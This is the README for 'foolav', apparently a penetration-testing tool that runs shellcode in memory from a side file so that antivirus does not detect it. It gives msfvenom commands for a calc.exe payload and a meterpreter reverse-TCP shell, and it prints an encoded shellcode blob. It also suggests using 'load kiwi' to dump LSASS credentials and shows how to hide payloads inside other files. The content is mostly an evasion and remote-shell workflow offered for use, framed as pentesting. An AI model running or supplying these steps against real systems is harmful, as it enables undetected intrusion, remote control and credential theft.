# foolav

Executable compiled with this code is useful during penetration tests where there is a need to execute some payload (meterpreter maybe?) while being certain that it will not be detected by antivirus software. The only requirement is to be able to upload two files: `binary executable` and `payload file` into the same directory.

## Usage steps

1. prepare your payload (x86), i.e.
   
   calc: ```
msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d\xff" -f c 2>/dev/null | egrep "^\"" | tr -d "\"\n;" >foolav.mf``` (you dont really need to use any encoder or characters blacklisting, it will work anyway)
   
   meterpreter: ```
msfvenom -p windows/meterpreter_reverse_tcp LHOST=... -a x86 -f c 2>/dev/null | egrep "^\"" | tr -d "\"\n;" >foolav.mf```
2. copy payload file `[executable-name-without-exe-extension].mf` in the same directory as executable
   payload running calc.exe generated using above command:
   ```
   # calc.exe
   \xbb\x28\x30\x85\x5b\xd9\xf7\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x33\x83\xea\xfc\x31\x5a\x0e\x03\x72\x3e\x67\xae\x7e\xd6\xee\x51\x7e\x27\x91\xd8\x9b\x16\x83\xbf\xe8\x0b\x13\xcb\xbc\xa7\xd8\x99\x54\x33\xac\x35\x5b\xf4\x1b\x60\x52\x05\xaa\xac\x38\xc5\xac\x50\x42\x1a\x0f\x68\x8d\x6f\x4e\xad\xf3\x80\x02\x66\x78\x32\xb3\x03\x3c\x8f\xb2\xc3\x4b\xaf\xcc\x66\x8b\x44\x67\x68\xdb\xf5\xfc\x22\xc3\x7e\x5a\x93\xf2\x53\xb8\xef\xbd\xd8\x0b\x9b\x3c\x09\x42\x64\x0f\x75\x09\x5b\xa0\x78\x53\x9b\x06\x63\x26\xd7\x75\x1e\x31\x2c\x04\xc4\xb4\xb1\xae\x8f\x6f\x12\x4f\x43\xe9\xd1\x43\x28\x7d\xbd\x47\xaf\x52\xb5\x73\x24\x55\x1a\xf2\x7e\x72\xbe\x5f\x24\x1b\xe7\x05\x8b\x24\xf7\xe1\x74\x81\x73\x03\x60\xb3\xd9\x49\x77\x31\x64\x34\x77\x49\x67\x16\x10\x78\xec\xf9\x67\x85\x27\xbe\x88\x67\xe2\xca\x20\x3e\x67\x77\x2d\xc1\x5d\xbb\x48\x42\x54\x43\xaf\x5a\x1d\x46\xeb\xdc\xcd\x3a\x64\x89\xf1\xe9\x85\x98\x91\x6c\x16\x40\x78\x0b\x9e\xe3\x84
   ```
3. once executable is run, payload file will be parsed, loaded into separate thread and executed in memory:
   
   ![screen](https://cloud.githubusercontent.com/assets/4956006/12366078/2c13213c-bbd9-11e5-8fc9-a7a62194158e.png)

## Hints

- x86 binary will run on both x86 and x86_64 Windows systems. Still, you need to use x86 architecture payloads. Nevertheless, x86 meterpreter payload can be migrated to x86_64 processes. After that, `load kiwi` will load x86_64 version making it possible to access juicy contents of LSASS process memory :)

  ![meter](https://cloud.githubusercontent.com/assets/4956006/12372509/aa21a00e-bc5a-11e5-8589-98ee8ce8bfc0.png)

- .mf payload file can be obfuscated - parser will ignore every character other than `\xHH` hexdecimal sequences. This means, it can append your payload to almost any file, hide it between the lines or even add your own comments, example:

![obfuscation](https://cloud.githubusercontent.com/assets/4956006/12372526/ca361694-bc5b-11e5-9a31-be6847cdcec2.png)

## Download

https://github.com/hvqzao/foolav/releases/download/v1.0/foolav.zip

## License

[MIT License](https://github.com/twbs/bootstrap/blob/master/LICENSE)
